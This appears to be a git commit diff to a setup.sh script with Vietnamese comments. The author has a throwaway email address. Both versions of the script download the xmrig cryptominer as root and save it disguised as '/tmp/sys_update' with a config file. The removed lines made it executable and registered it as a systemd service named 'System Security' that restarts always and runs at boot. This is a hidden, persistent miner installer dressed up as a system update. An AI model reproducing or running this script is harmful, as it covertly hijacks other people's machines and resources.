8d3e6da89596d64520e26aad1e2685874498667f
AnnaliseHackett <fdsjkrnennnnnnnnnnnnnnnnugierhguierhngiengioejgfmeofe@tempmail.ckvn.edu.vn>
2026-01-25 10:29:49 +0700

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,21 +1,15 @@
-# 1. Chuyển vào thư mục tạm
+# Di chuyển vào thư mục tạm (nơi Service sẽ đọc file)
+
 cd /tmp
 
-# 2. Tải và làm sạch file config
+
+
+# Tải lại file config với quyền sudo và lọc bỏ ký tự lạ
+
 sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json | tr -d '\r' | sudo tee /tmp/config.json > /dev/null
 
-# 3. Tải file thực thi
+
+
+# Đảm bảo file thực thi sys_update cũng nằm ở đây
+
 sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /tmp/sys_update
-sudo chmod +x /tmp/sys_update
-
-# 4. Tạo file cấu hình Startup (Trỏ vào /tmp)
-sudo printf "[Unit]\nDescription=System Security\nAfter=network.target\n\n[Service]\nExecStart=/tmp/sys_update --config=/tmp/config.json\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n" | sudo tee /etc/systemd/system/sys_update.service > /dev/null
-
-# 5. Nạp lại hệ thống để hết báo lỗi "Warning"
-sudo systemctl daemon-reload
-
-# 6. Kích hoạt tự động chạy khi bật máy (STARTUP)
-sudo systemctl enable sys_update
-
-# 7. Khởi động dịch vụ
-sudo systemctl restart sys_update
